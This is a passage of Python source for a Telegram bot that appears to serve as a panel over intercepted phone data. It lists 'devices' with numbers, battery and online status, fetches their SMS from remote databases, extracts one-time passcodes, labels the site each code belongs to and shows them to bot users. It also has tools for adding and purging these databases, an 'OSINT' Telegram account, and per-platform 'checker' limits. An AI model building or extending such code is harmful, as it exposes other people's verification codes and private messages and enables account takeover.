        [ibtn(sc("Storage & Backup"), cb="admin:storage", style="primary", eid=PREMIUM_EMOJIS.get("backup")), ibtn(sc("Content & Media"), cb="admin:media", style="primary", eid=PREMIUM_EMOJIS.get("book"))],
        [ibtn(sc("Texts"), cb="admin:texts", style="primary", eid=PREMIUM_EMOJIS.get("book")), ibtn(sc("Clones"), cb="admin:clones", style="primary", eid=PREMIUM_EMOJIS.get("rocket"))],
        [ibtn(sc("Broadcast"), cb="admin:broadcast", style="primary", eid=PREMIUM_EMOJIS.get("bell")), ibtn(sc("Force Join"), cb="admin:fj", style="primary", eid=PREMIUM_EMOJIS.get("lock"))],
        [ibtn(sc("Referral Gate"), cb="admin:ref", style="primary", eid=PREMIUM_EMOJIS.get("sparkle")), ibtn(sc("TG Account (OSINT)"), cb="admin:tg", style="primary", eid=PREMIUM_EMOJIS.get("ghost"))],
        [ibtn(sc("Checker Limits"), cb="admin:limits", style="primary", eid=PREMIUM_EMOJIS.get("chart")), ibtn(sc("Tools"), cb="admin:tools", style="primary", eid=PREMIUM_EMOJIS.get("rocket"))],
        [ibtn(sc("Dashboard"), cb="admin:dashboard", style="success", eid=PREMIUM_EMOJIS.get("chart"))],
        [ibtn(sc("Back"), cb="reveal:prev", eid=PREMIUM_EMOJIS.get("cross"))],
    ])

def kb_admin_databases():
    return InlineKeyboardMarkup([
        [ibtn(sc("Add Active (URL)"), cb="db:add:active:url", style="success", eid=PREMIUM_EMOJIS.get("check")), ibtn(sc("Add Active (TXT)"), cb="db:add:active:txt", style="success", eid=PREMIUM_EMOJIS.get("upload"))],
        [ibtn(sc("Add All (URL)"), cb="db:add:all:url", style="primary", eid=PREMIUM_EMOJIS.get("check")), ibtn(sc("Add All (TXT)"), cb="db:add:all:txt", style="primary", eid=PREMIUM_EMOJIS.get("upload"))],
        [ibtn(sc("Add Custom DB"), cb="db:add:custom", style="success", eid=PREMIUM_EMOJIS.get("add")), ibtn(sc("Delete DB by Tag"), cb="db:remove", style="danger", eid=PREMIUM_EMOJIS.get("delete"))],
        [ibtn(sc("Remove Dead DBs"), cb="db:purge", style="danger", eid=PREMIUM_EMOJIS.get("cross")), ibtn(sc("List DBs"), cb="db:list", style="primary", eid=PREMIUM_EMOJIS.get("book"))],
        [ibtn(sc("DB Stats"), cb="db:stats", style="primary", eid=PREMIUM_EMOJIS.get("chart"))],
        [ibtn(sc("Back"), cb="admin:menu", eid=PREMIUM_EMOJIS.get("cross"))],
    ])

def kb_admin_tg():
    status = "✅ Connected" if tg_client else "❌ Disconnected"
    return InlineKeyboardMarkup([
        [ibtn(f"Status: {status}", cb="tg:status", style="success" if tg_client else "danger")],
        [ibtn(sc("Set API ID"), cb="tg:api_id", style="primary"), ibtn(sc("Set API HASH"), cb="tg:api_hash", style="primary")],
        [ibtn(sc("Set Session String"), cb="tg:session", style="primary")],
        [ibtn(sc("Reconnect Client"), cb="tg:reconnect", style="success")],
        [ibtn(sc("Back"), cb="admin:menu", eid=PREMIUM_EMOJIS.get("cross"))],
    ])

def kb_admin_limits():
    return InlineKeyboardMarkup([
        [ibtn(f"TG Limit: {DAILY_TG_LIMIT}/day", cb="limit:tg", style="primary")],
        [ibtn(f"WA Limit: {DAILY_WA_LIMIT}/day", cb="limit:wa", style="primary")],
        [ibtn(f"FB Limit: {DAILY_FB_LIMIT}/day", cb="limit:fb", style="primary")],
        [ibtn(sc("Back"), cb="admin:menu", eid=PREMIUM_EMOJIS.get("cross"))],
    ])

def kb_admin_users():
    return InlineKeyboardMarkup([
        [ibtn(sc("Grant Access"), cb="u:grant", style="success", eid=PREMIUM_EMOJIS.get("check")), ibtn(sc("Revoke Access"), cb="u:revoke", style="danger", eid=PREMIUM_EMOJIS.get("cross"))],
        [ibtn(sc("View Allowed"), cb="u:view_allowed", style="primary", eid=PREMIUM_EMOJIS.get("book")), ibtn(sc("Toggle Gate"), cb="u:toggle_gate", style="primary", eid=PREMIUM_EMOJIS.get("lock"))],
        [ibtn(sc("Admins"), cb="u:admins", style="primary", eid=PREMIUM_EMOJIS.get("shield"))],
        [ibtn(sc("Back"), cb="admin:menu", eid=PREMIUM_EMOJIS.get("cross"))],
    ])

def kb_admin_admins():
    return InlineKeyboardMarkup([
        [ibtn(sc("Add Admin"), cb="adm:add", style="success", eid=PREMIUM_EMOJIS.get("add")), ibtn(sc("Remove Admin"), cb="adm:remove", style="danger", eid=PREMIUM_EMOJIS.get("cross"))],
        [ibtn(sc("List Admins"), cb="adm:list", style="primary", eid=PREMIUM_EMOJIS.get("book"))],
        [ibtn(sc("Back"), cb="admin:users", eid=PREMIUM_EMOJIS.get("cross"))],
    ])

def kb_admin_emojis():
    return InlineKeyboardMarkup([
        [ibtn(sc("List"), cb="emoji:list", style="primary", eid=PREMIUM_EMOJIS.get("book")), ibtn(sc("Add"), cb="emoji:add", style="success", eid=PREMIUM_EMOJIS.get("add"))],
        [ibtn(sc("Remove"), cb="emoji:remove", style="danger", eid=PREMIUM_EMOJIS.get("cross")), ibtn(sc("Test All"), cb="emoji:test", style="success", eid=PREMIUM_EMOJIS.get("sparkle"))],
        [ibtn(sc("Back"), cb="admin:menu", eid=PREMIUM_EMOJIS.get("cross"))],
    ])

def kb_admin_live():
    toggle = sc("Disable") if LIVE_MONITOR else sc("Enable")
    style = "danger" if LIVE_MONITOR else "success"
    return InlineKeyboardMarkup([
        [ibtn(toggle, cb="live:toggle", style=style, eid=PREMIUM_EMOJIS.get("device"))],
        [ibtn(sc("Set Monitor Chat"), cb="live:set_chat", style="primary", eid=PREMIUM_EMOJIS.get("chart")), ibtn(sc("Status"), cb="live:status", style="primary", eid=PREMIUM_EMOJIS.get("book"))],
        [ibtn(sc("Toggle Admin-DB Filter"), cb="live:toggle_admin", style="primary", eid=PREMIUM_EMOJIS.get("fire"))],
        [ibtn(sc("Back"), cb="admin:menu", eid=PREMIUM_EMOJIS.get("cross"))],
    ])

def kb_admin_storage():
    toggle = sc("Disable Auto") if AUTO_BACKUP_ENABLED else sc("Enable Auto")
    style = "danger" if AUTO_BACKUP_ENABLED else "success"
    return InlineKeyboardMarkup([
        [ibtn(sc("Set Target Chat"), cb="st:set_chat", style="primary", eid=PREMIUM_EMOJIS.get("chart")), ibtn(sc("Set Interval"), cb="st:set_interval", style="primary", eid=PREMIUM_EMOJIS.get("bell"))],
        [ibtn(toggle, cb="st:toggle", style=style, eid=PREMIUM_EMOJIS.get("backup"))],
        [ibtn(sc("Send Now"), cb="st:send_now", style="success", eid=PREMIUM_EMOJIS.get("upload")), ibtn(sc("Storage Files"), cb="st:files", style="primary", eid=PREMIUM_EMOJIS.get("book"))],
        [ibtn(sc("Retention"), cb="st:retention", style="primary", eid=PREMIUM_EMOJIS.get("lock"))],
        [ibtn(sc("Back"), cb="admin:menu", eid=PREMIUM_EMOJIS.get("cross"))],
    ])

def kb_admin_media():
    spoiler = sc("ON") if WELCOME_MEDIA.get("spoiler") else sc("OFF")
    rot = sc("ALWAYS") if ROTATION_ALWAYS else sc("Fallback")
    return InlineKeyboardMarkup([
        [ibtn(sc("Set Welcome Media"), cb="md:set_welcome", style="primary", eid=PREMIUM_EMOJIS.get("upload")), ibtn(sc("Set Welcome Text"), cb="md:set_text", style="primary", eid=PREMIUM_EMOJIS.get("book"))],
        [ibtn(sc("Add Rotation"), cb="md:add_rot", style="primary", eid=PREMIUM_EMOJIS.get("upload")), ibtn(sc("View Media"), cb="md:view", style="primary", eid=PREMIUM_EMOJIS.get("heart"))],
        [ibtn(f"{sc('Spoiler')}: {spoiler}", cb="md:toggle_spoiler", style="primary", eid=PREMIUM_EMOJIS.get("ghost")), ibtn(f"{sc('Rotation')}: {rot}", cb="md:toggle_rot", style="primary", eid=PREMIUM_EMOJIS.get("fire"))],
        [ibtn(sc("Clear Welcome"), cb="md:clear_welcome", style="danger", eid=PREMIUM_EMOJIS.get("delete")), ibtn(sc("Clear Rotation"), cb="md:clear_rot", style="danger", eid=PREMIUM_EMOJIS.get("delete"))],
        [ibtn(sc("Back"), cb="admin:menu", eid=PREMIUM_EMOJIS.get("cross"))],
    ])

def kb_admin_texts():
    return InlineKeyboardMarkup([
        [ibtn(sc("Welcome Text"), cb="txt:set:welcome", style="primary", eid=PREMIUM_EMOJIS.get("book")), ibtn(sc("Help Text"), cb="txt:set:help", style="primary", eid=PREMIUM_EMOJIS.get("book"))],
        [ibtn(sc("Support Text"), cb="txt:set:support", style="primary", eid=PREMIUM_EMOJIS.get("heart")), ibtn(sc("Maintenance Text"), cb="txt:set:maint", style="primary", eid=PREMIUM_EMOJIS.get("lock"))],
        [ibtn(sc("View All Texts"), cb="txt:view", style="primary", eid=PREMIUM_EMOJIS.get("book")), ibtn(sc("Reset All"), cb="txt:reset", style="danger", eid=PREMIUM_EMOJIS.get("delete"))],
        [ibtn(sc("Back"), cb="admin:menu", eid=PREMIUM_EMOJIS.get("cross"))],
    ])

def kb_admin_clones():
    return InlineKeyboardMarkup([
        [ibtn(sc("Add Clone"), cb="cl:add", style="success", eid=PREMIUM_EMOJIS.get("add")), ibtn(sc("List Clones"), cb="cl:list", style="primary", eid=PREMIUM_EMOJIS.get("book"))],
        [ibtn(sc("Remove Clone"), cb="cl:remove", style="danger", eid=PREMIUM_EMOJIS.get("delete"))],
        [ibtn(sc("Back"), cb="admin:menu", eid=PREMIUM_EMOJIS.get("cross"))],
    ])

def kb_admin_broadcast():
    return InlineKeyboardMarkup([
        [ibtn(sc("Copy (silent)"), cb="bc:start:copy", style="primary", eid=PREMIUM_EMOJIS.get("ghost")), ibtn(sc("Premium Wrap"), cb="bc:start:premium", style="success", eid=PREMIUM_EMOJIS.get("sparkle"))],
        [ibtn(sc("Forward"), cb="bc:start:forward", style="primary", eid=PREMIUM_EMOJIS.get("rocket")), ibtn(sc("Silent Copy"), cb="bc:start:silent", style="primary", eid=PREMIUM_EMOJIS.get("ghost"))],
        [ibtn(sc("Back"), cb="admin:menu", eid=PREMIUM_EMOJIS.get("cross"))],
    ])

def kb_admin_fj():
    toggle = sc("Disable") if FORCE_JOIN_ENABLED else sc("Enable")
    style = "danger" if FORCE_JOIN_ENABLED else "success"
    return InlineKeyboardMarkup([
        [ibtn(toggle, cb="fj:toggle", style=style, eid=PREMIUM_EMOJIS.get("lock"))],
        [ibtn(sc("Add Public"), cb="fj:add_public", style="primary", eid=PREMIUM_EMOJIS.get("add")), ibtn(sc("Add Private"), cb="fj:add_private", style="primary", eid=PREMIUM_EMOJIS.get("lock"))],
        [ibtn(sc("List Channels"), cb="fj:list", style="primary", eid=PREMIUM_EMOJIS.get("book")), ibtn(sc("Remove"), cb="fj:remove", style="danger", eid=PREMIUM_EMOJIS.get("delete"))],
        [ibtn(sc("Back"), cb="admin:menu", eid=PREMIUM_EMOJIS.get("cross"))],
    ])

def kb_admin_ref():
    toggle = sc("Disable") if REFERRAL_ENABLED else sc("Enable")
    style = "danger" if REFERRAL_ENABLED else "success"
    return InlineKeyboardMarkup([
        [ibtn(toggle, cb="ref:toggle", style=style, eid=PREMIUM_EMOJIS.get("sparkle")), ibtn(sc("Set Required"), cb="ref:set_required", style="primary", eid=PREMIUM_EMOJIS.get("check"))],
        [ibtn(sc("View Progress"), cb="ref:view_progress", style="primary", eid=PREMIUM_EMOJIS.get("chart"))],
        [ibtn(sc("Back"), cb="admin:menu", eid=PREMIUM_EMOJIS.get("cross"))],
    ])

def kb_admin_tools():
    toggle = sc("Disable Maint") if MAINTENANCE_MODE else sc("Enable Maint")
    style = "danger" if MAINTENANCE_MODE else "success"
    return InlineKeyboardMarkup([
        [ibtn(sc("Export JSON"), cb="tool:export:json", style="success", eid=PREMIUM_EMOJIS.get("upload")), ibtn(sc("Export SQLite"), cb="tool:export:sqlite", style="success", eid=PREMIUM_EMOJIS.get("upload"))],
        [ibtn(sc("Import File"), cb="tool:import", style="primary", eid=PREMIUM_EMOJIS.get("upload"))],
        [ibtn(toggle, cb="tool:maint", style=style, eid=PREMIUM_EMOJIS.get("lock"))],
        [ibtn(sc("System Info"), cb="tool:info", style="primary", eid=PREMIUM_EMOJIS.get("chart"))],
        [ibtn(sc("Back"), cb="admin:menu", eid=PREMIUM_EMOJIS.get("cross"))],
    ])

def kb_devices(devs, page, admin):
    total = max(1, (len(devs) + 8 - 1) // 8)
    page = max(0, min(page, total - 1))
    chunk = devs[page*8:(page+1)*8]
    rows = []
    for d in chunk:
        lbl = mask_num(d.numbers[0], admin) if d.numbers else d.name
        rows.append([ibtn(f"{'🟢' if d.online else '🔴'} {lbl[:28]}", cb=f"dev:{d.id}", style="success" if d.online else "danger")])
    nav = []
    if page > 0: nav.append(ibtn("◀️", cb=f"nav:devices:{page-1}"))
    nav.append(ibtn(f"{page+1}/{total}", cb="noop"))
    if page < total-1: nav.append(ibtn("▶️", cb=f"nav:devices:{page+1}"))
    if nav: rows.append(nav)
    rows.append([ibtn(sc("Back"), cb="reveal:prev", eid=PREMIUM_EMOJIS.get("cross"))])
    return InlineKeyboardMarkup(rows), total

def kb_device_detail(dev, watching):
    toggle = sc("Stop Watching") if watching else sc("Watch Device")
    toggle_style = "danger" if watching else "success"
    return InlineKeyboardMarkup([
        [ibtn(toggle, cb=f"dev:{dev.id}:w", style=toggle_style, eid=PREMIUM_EMOJIS.get("bell"))],
        [ibtn(sc("Last OTPs"), cb=f"dev:{dev.id}:otps", style="success", eid=PREMIUM_EMOJIS.get("key")), ibtn(sc("Last SMS"), cb=f"dev:{dev.id}:sms", style="primary", eid=PREMIUM_EMOJIS.get("book"))],
        [ibtn(sc("Back"), cb="reveal:prev", eid=PREMIUM_EMOJIS.get("cross"))],
    ])

def kb_panels(tags, page):
    per = 12
    total = max(1, (len(tags) + per - 1) // per)
    page = max(0, min(page, total-1))
    chunk = tags[page*per:(page+1)*per]
    rows, buf = [], []
    for tag in chunk:
        buf.append(ibtn(tag[:20], cb=f"panel:{tag}:0", style="primary"))
        if len(buf) == 2: rows.append(buf); buf = []
    if buf: rows.append(buf)
    nav = []
    if page > 0: nav.append(ibtn("◀️", cb=f"nav:panels:{page-1}"))
    nav.append(ibtn(f"{page+1}/{total}", cb="noop"))
    if page < total-1: nav.append(ibtn("▶️", cb=f"nav:panels:{page+1}"))
    if nav: rows.append(nav)
    rows.append([ibtn(sc("Back"), cb="reveal:prev", eid=PREMIUM_EMOJIS.get("cross"))])
    return InlineKeyboardMarkup(rows)

def kb_back(): return InlineKeyboardMarkup([[ibtn(sc("Back"), cb="reveal:prev", eid=PREMIUM_EMOJIS.get("cross"))]])

# ══════════════════════════════════════════════════════════════════
# TEXT BUILDERS
# ══════════════════════════════════════════════════════════════════
def text_devices(devs, page, total):
    online = sum(1 for d in devs if d.online)
    nums = sum(len(d.numbers) for d in devs)
    return premium_text("devices list", [
        f"{pem('device','📱')} total: <b>{len(devs)}</b>",
        f"{pem('online','🟢')} online: <b>{online}</b> · {pem('offline','🔴')} offline: <b>{len(devs)-online}</b>",
        f"{pem('phone','🔢')} numbers: <b>{nums}</b>", "",
        f"<i>page {page+1}/{total}</i>",
    ], icon="device")

def text_device(dev, otp_obj=None, site=None, eid=None):
    lines = [
        f"{pem('phone','📞')} number: <code>{esc(dev.numbers[0] if dev.numbers else '—')}</code>",
        f"{pem('device','⚙️')} name: {esc(dev.name[:25])}",
        f"{pem('online' if dev.online else 'offline','📶')} status: <b>{dev.status}</b> · 🔋 {dev.battery}%",
        f"{pem('fire','🔥')} panel: <code>{esc(dev.tag)}</code>",
    ]
    if otp_obj:
        lines.append(f"{em(eid or '5253742260054409879','🌐')} site: <b>{esc(site or 'unknown')}</b>")
        lines.append(f"{pem('key','🔑')} latest otp: <code>{esc(otp_obj.code)}</code>")
    return premium_text("device terminal", lines, icon="device")

def text_media_status():
    m = WELCOME_MEDIA
    media_line = f"🎬 media: <b>{m['type']}</b> ✅" if m.get("file_id") else "🎬 media: <i>not set</i>"
    return premium_text("content & media", [
        media_line,
        f"🙈 spoiler: <b>{'on' if m.get('spoiler') else 'off'}</b>",
        f"📝 welcome text: <b>{'custom' if WELCOME_TEXT.strip() else 'default'}</b>",
        f"📹 rotation: <b>{len(ROTATION_MEDIA)}</b>",
        f"🔄 mode: <b>{'always' if ROTATION_ALWAYS else 'fallback'}</b>",
    ], icon="book")

def text_clone_status():
    lines = [f"🤖 active: <b>{len(CLONE_APPS)}</b>", f"📋 stored: <b>{len(CLONES)}</b>", ""]
    if not CLONES: lines.append("<i>no clones configured.</i>")
    else:
        for i, c in enumerate(CLONES, 1):
            tok = c.get("token", "")
            mark = "🟢" if tok in CLONE_APPS else "🔴"
            uname = c.get("username") or (tok.split(":")[0] if tok else "?")
            lines.append(f"{mark} {i}. @{esc(uname)}")
    return premium_text("clone manager", lines, icon="rocket")

def text_emojis_list():
    lines = []
    for n, eid in PREMIUM_EMOJIS.items():
        prev = f'<tg-emoji emoji-id="{eid}">•</tg-emoji>'
        lines.append(f"{prev} <code>{esc(n)}</code>  ·  <code>{esc(eid)}</code>")
    return premium_text(f"premium emojis ({len(PREMIUM_EMOJIS)})", lines or ["<i>none</i>"], icon="sparkle")

def text_live_status():
    chat = str(LIVE_MONITOR_CHAT) if LIVE_MONITOR_CHAT else "—"
    return premium_text("live monitor", [
        f"📡 state: <b>{'🟢 ON' if LIVE_MONITOR else '🔴 OFF'}</b>",
        f"🎯 chat: <code>{esc(chat)}</code>",
        f"🔥 filter: <b>{'admin-only DBs' if LIVE_MONITOR_ONLY_ADMIN_DEV else 'all DBs'}</b>",
    ], icon="device")

def text_storage():
    files = _list_backups()
    lines = [
        f"💾 retention: <b>{STORAGE_RETENTION}</b>",
        f"🎯 target chat: <code>{esc(AUTO_BACKUP_CHAT or '—')}</code>",
        f"⏱ interval: <b>{_fmt_interval(AUTO_BACKUP_INTERVAL)}</b>",
        f"⚡ enabled: <b>{'yes' if AUTO_BACKUP_ENABLED else 'no'}</b>",
        f"🕒 last backup: <b>{datetime.fromtimestamp(LAST_BACKUP_TS).strftime('%d %b %H:%M') if LAST_BACKUP_TS else '—'}</b>",
        "",
    ]
    if files:
        lines.append(f"<b>local files ({len(files)}):</b>")
        for f in files[:8]:
            dt = datetime.fromtimestamp(f["ts"]/1000).strftime("%d %b %H:%M")
            lines.append(f"📄 <code>{esc(f['filename'])}</code>\n    {dt} · {_size_str(f['size'])}")
    else:
        lines.append("<i>no local backups.</i>")
    return premium_text("storage", lines, icon="backup")

# ══════════════════════════════════════════════════════════════════
# SEND / EDIT / NAV
# ══════════════════════════════════════════════════════════════════
async def reply(update, ctx, text, kb=None):
    if update.message:
        await update.message.reply_text(text, reply_markup=kb, parse_mode="HTML", disable_web_page_preview=True)
    elif update.callback_query and update.callback_query.message:
        try:
            await update.callback_query.edit_message_text(text, reply_markup=kb, parse_mode="HTML", disable_web_page_preview=True)
        except BadRequest as e:
            if "not modified" not in str(e).lower():
                await update.effective_chat.send_message(text, reply_markup=kb, parse_mode="HTML", disable_web_page_preview=True)

def _push_view(uid, spec):
    stack = view_stack.setdefault(uid, [])
    if stack and stack[-1] == spec: return
    stack.append(spec)
    if len(stack) > 20: del stack[0]

def _pop_view(uid):
    stack = view_stack.get(uid) or []
    if len(stack) <= 1:
        view_stack.pop(uid, None); return None
    stack.pop(); return stack[-1]

VIEW_REGISTRY = {}
def register_view(kind):
    def deco(fn): VIEW_REGISTRY[kind] = fn; return fn
    return deco

def _pick_media():
    if ROTATION_ALWAYS and ROTATION_MEDIA: return random.choice(ROTATION_MEDIA)
    if WELCOME_MEDIA.get("file_id"): return WELCOME_MEDIA
    if ROTATION_MEDIA: return random.choice(ROTATION_MEDIA)
    return None

async def delete_welcome(update, ctx):
    chat = update.effective_chat
    if not chat: return
    mid = welcome_msgs.pop(chat.id, None)
    if mid:
        try: await ctx.bot.delete_message(chat.id, mid)
        except Exception: pass

async def send_result(update, ctx, text, kb=None, view_spec=None):
    chat = update.effective_chat
    if not chat: return
    uid = chat.id
    if view_spec: _push_view(uid, view_spec)
    prev = last_result_msgs.pop(uid, None)
    if prev:
        for mid in (prev.get("ids") or []):
            try: await ctx.bot.delete_message(uid, mid)
            except Exception: pass
    await delete_welcome(update, ctx)
    cq = update.callback_query
    if cq and cq.message:
        try: await cq.message.delete()
        except Exception: pass
    media = _pick_media()
    ids = []
    if media:
        method = ctx.bot.send_photo if media["type"] == "photo" else ctx.bot.send_video
        if len(text) <= 1024:
            try:
                msg = await method(chat_id=uid, **{media["type"]: media["file_id"]}, caption=text, reply_markup=kb, parse_mode="HTML", has_spoiler=bool(media.get("spoiler")))
                ids = [msg.message_id]
            except Exception:
                msg = await ctx.bot.send_message(uid, text, reply_markup=kb, parse_mode="HTML", disable_web_page_preview=True)
                ids = [msg.message_id]
        else:
            hdr = await method(chat_id=uid, **{media["type"]: media["file_id"]}, caption=premium_text("media section", ["<i>follows below</i>"], icon="book"), parse_mode="HTML", has_spoiler=bool(media.get("spoiler")))
            body = await ctx.bot.send_message(uid, text, reply_markup=kb, parse_mode="HTML", disable_web_page_preview=True)
            ids = [hdr.message_id, body.message_id]
    else:
        msg = await ctx.bot.send_message(uid, text, reply_markup=kb, parse_mode="HTML", disable_web_page_preview=True)
        ids = [msg.message_id]
    last_result_msgs[uid] = {"ids": ids}

# ══════════════════════════════════════════════════════════════════
# /start
# ══════════════════════════════════════════════════════════════════
async def cmd_start(update, ctx):
    chat = update.effective_chat
    if chat is None: return
    uid = chat.id
    u = update.effective_user
    admin = is_admin(uid)

    u_data = all_users.get(uid)
    if not u_data:
        u_data = {"name": u.full_name, "username": u.username or "", "banned": False, "referrals": []}
        all_users[uid] = u_data
        await db.save_user(uid, u_data)
    elif u:
        u_data["name"] = u.full_name
        u_data["username"] = u.username or ""
        await db.save_user(uid, u_data)

    if u_data.get("banned"):
        await reply(update, ctx, premium_text("error", ["🚫 <b>you are banned.</b>"], icon="cross")); return
    if not admin and MAINTENANCE_MODE:
        msg = MAINTENANCE_TEXT.strip() or premium_text("maintenance mode", ["🛠 <i>please try again later.</i>"], icon="lock")
        await reply(update, ctx, msg); return

    view_stack.pop(uid, None)
    prev = last_result_msgs.pop(uid, None)
    if prev:
        for mid in (prev.get("ids") or []):
            try: await ctx.bot.delete_message(uid, mid)
            except Exception: pass
    await delete_welcome(update, ctx)

    welcome = WELCOME_TEXT.strip() or premium_text(BOT_BRAND, [
        f"{pem('ghost','👤')} your id: <code>{uid}</code>",
        f"{pem('shield','🎭')} role: {'owner' if admin else 'user'}",
        f"{pem('star','⭐')} use the keyboard below.",
    ], icon="rocket")
    kb = kb_main(admin)
    sent = await ctx.bot.send_message(uid, welcome, reply_markup=kb, parse_mode="HTML")
    if sent: welcome_msgs[uid] = sent.message_id

# ══════════════════════════════════════════════════════════════════
# BROADCAST BUTTON COMMAND
# ══════════════════════════════════════════════════════════════════
async def cmd_broadcastbtn(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_chat.id
    if not is_admin(uid): return
    if not update.message.reply_to_message:
        await update.message.reply_text(premium_text("error", ["❌ <b>You must reply to a message to broadcast it.</b>\n\n<i>Reply to any message with:</i>\n<code>/broadcastbtn Button Text | https://example.com | success | EMOJI_ID</code>"], icon="cross"), parse_mode="HTML"); return
        
    text = update.message.text.replace("/broadcastbtn", "").strip()
    parts = [p.strip() for p in text.split("|")]
    if len(parts) < 2:
        await update.message.reply_text(premium_text("error", ["❌ <b>Usage:</b>\n<code>/broadcastbtn Button Text | https://example.com | style | emoji_id</code>"], icon="cross"), parse_mode="HTML"); return
        
    btn_text = parts[0]
    url = parts[1]
    style = parts[2] if len(parts) > 2 and parts[2] in ("primary", "success", "danger") else None
    eid = parts[3] if len(parts) > 3 else None
    if not url.startswith("http"):
        await update.message.reply_text(premium_text("error", ["❌ <b>Invalid URL. Must start with http/https</b>"], icon="cross"), parse_mode="HTML"); return
        
    btn = ibtn(btn_text, url=url, style=style, eid=eid)
    kb = InlineKeyboardMarkup([[btn]])
    
    targets = [u for u in all_users if u != uid and not all_users[u].get("banned")]
    sent = blocked = failed = 0
    msg = await update.message.reply_text(premium_text("broadcasting", [f"🚀 <b>Broadcasting to {len(targets)} users...</b>"], icon="rocket"), parse_mode="HTML")
    
    for u in targets:
        try:
            await ctx.bot.copy_message(chat_id=u, from_chat_id=update.message.reply_to_message.chat_id, message_id=update.message.reply_to_message.message_id, reply_markup=kb)
            sent += 1
        except Forbidden: blocked += 1
        except Exception: failed += 1
        await asyncio.sleep(0.05)
        
    await msg.edit_text(premium_text("broadcast complete", [f"✅ sent: <b>{sent}</b>\n⛔ blocked: <b>{blocked}</b>\n⚠️ failed: <b>{failed}</b>"], icon="check"), parse_mode="HTML")

# ══════════════════════════════════════════════════════════════════
# CHAT JOIN REQUEST
# ══════════════════════════════════════════════════════════════════
async def on_join_request(update, ctx):
    cjr = update.chat_join_request
    if cjr is None: return
    uid = cjr.from_user.id
    chat_id = cjr.chat.id
    matched = None
    for ch in FORCE_JOIN_CHANNELS:
        if ch.get("type") == "private":
            try:
                if int(ch.get("channel", 0)) == chat_id: matched = ch; break
            except Exception: pass
    if not matched: return

    allowed_users.add(uid)
    private_requesters.add(uid)
    await db.set_setting("allowed", list(allowed_users))
    
    try:
        await ctx.bot.send_message(uid, premium_text("access granted", [
            "✅ <b>bot access granted</b>",
            f"📢 <code>{esc(matched.get('title') or chat_id)}</code>",
            "",
            "<i>your group join request is pending admin approval.</i>",
            "<i>you'll be added to the group once an admin accepts it.</i>",
            "<i>meanwhile you can use the bot right now.</i>",
            "",
            "<b>send /start to begin.</b>",
        ], icon="check"), parse_mode="HTML")
    except Exception as e:
        log.debug(f"join request DM: {e}")

# ══════════════════════════════════════════════════════════════════
# VIEWS
# ══════════════════════════════════════════════════════════════════
@register_view("devices")
async def view_devices(update, ctx, page=0):
    admin = is_admin(update.effective_chat.id)
    devs = merged_devices(admin)
    spec = {"kind": "devices", "args": {"page": page}}
    if not devs:
        await send_result(update, ctx, premium_text("devices list", ["📭 <i>no devices discovered.</i>"], icon="device"), kb_back(), view_spec=spec); return
    kb, total = kb_devices(devs, page, admin)
    await send_result(update, ctx, text_devices(devs, page, total), kb, view_spec=spec)

@register_view("device")
async def view_device(update, ctx, dev_id):
    uid = update.effective_chat.id
    admin = is_admin(uid)
    spec = {"kind": "device", "args": {"dev_id": dev_id}}
    dev = next((d for d in merged_devices(admin) if d.id == dev_id), None)
    if not dev:
        await send_result(update, ctx, premium_text("error", ["❌ <b>device not found.</b>"], icon="cross"), kb_back(), view_spec=spec); return
    otp_obj, site, eid = None, None, None
    try:
        bulk = await FB.get(dev.base_url, dev.sms_path)
        if isinstance(bulk, dict):
            entries = [{"_k": k, **v} for k, v in bulk.items() if isinstance(v, dict)]
            entries.sort(key=lambda s: int(s.get("timestamp") or 0), reverse=True)
            num = dev.numbers[0] if dev.numbers else dev.name
            for s in entries[:10]:
                o = extract_otp(_body(s))
                if not o: continue
                if otp_obj is None:
                    otp_obj = o; site, eid = detect_site(s.get("sender",""), o.context)
                await log_user_otp(uid, num, s.get("sender","—"), o, dev.tag)
    except Exception: pass
    watching = user_focus.get(uid) == dev.id
    await send_result(update, ctx, text_device(dev, otp_obj, site, eid), kb_device_detail(dev, watching), view_spec=spec)

@register_view("device_otps")
async def view_device_otps(update, ctx, dev_id):
    uid = update.effective_chat.id
    admin = is_admin(uid)
    spec = {"kind": "device_otps", "args": {"dev_id": dev_id}}
    dev = next((d for d in merged_devices(admin) if d.id == dev_id), None)
    if not dev:
        await send_result(update, ctx, premium_text("error", ["❌ <b>device not found.</b>"], icon="cross"), kb_back(), view_spec=spec); return
    bulk = await FB.get(dev.base_url, dev.sms_path) or {}
    entries = [{"_k": k, **v} for k, v in bulk.items() if isinstance(v, dict)] if isinstance(bulk, dict) else []
    entries.sort(key=lambda s: int(s.get("timestamp") or 0), reverse=True)
    lines = []
    num = dev.numbers[0] if dev.numbers else dev.name
    for s in entries:
        o = extract_otp(_body(s))
        if not o: continue
        site, eid = detect_site(s.get("sender",""), o.context)
        lines.append(f"{em(eid,'🌐')} <b>{esc(site)}</b>\n{pem('key','🔑')} <code>{esc(o.code)}</code>\n{pem('chart','📅')} {esc(sms_date(s))}")
        await log_user_otp(uid, num, s.get("sender","—"), o, dev.tag)
        if len(lines) >= 15: break
    if not lines: lines = ["📭 <i>no otps on this device.</i>"]
    await send_result(update, ctx, premium_text("recent otps", lines, icon="key"), kb_back(), view_spec=spec)

@register_view("device_sms")
async def view_device_sms(update, ctx, dev_id):
    admin = is_admin(update.effective_chat.id)
    spec = {"kind": "device_sms", "args": {"dev_id": dev_id}}
    dev = next((d for d in merged_devices(admin) if d.id == dev_id), None)
    if not dev:
        await send_result(update, ctx, premium_text("error", ["❌ <b>device not found.</b>"], icon="cross"), kb_back(), view_spec=spec); return
    bulk = await FB.get(dev.base_url, dev.sms_path) or {}
    entries = [{"_k": k, **v} for k, v in bulk.items() if isinstance(v, dict)] if isinstance(bulk, dict) else []
    entries.sort(key=lambda s: int(s.get("timestamp") or 0), reverse=True)
    lines = []
    for s in entries[:10]:
        lines.append(f"{pem('ghost','👤')} <b>{esc(str(s.get('sender','—'))[:24])}</b>\n{pem('chart','📅')} {esc(sms_date(s))}\n{pem('book','💬')} {esc(_body(s)[:160])}")
    if not lines: lines = ["📭 <i>no sms.</i>"]
    await send_result(update, ctx, premium_text("last sms", lines, icon="book"), kb_back(), view_spec=spec)

@register_view("panels")
async def view_panels(update, ctx, page=0):
    admin = is_admin(update.effective_chat.id)
    tags = sorted(t for t in DATABASES if admin or t not in ADMIN_ONLY_TAGS)
    spec = {"kind": "panels", "args": {"page": page}}
    if not tags:
        await send_result(update, ctx, premium_text("panels", ["📭 <i>no panels.</i>"], icon="book"), kb_back(), view_spec=spec); return
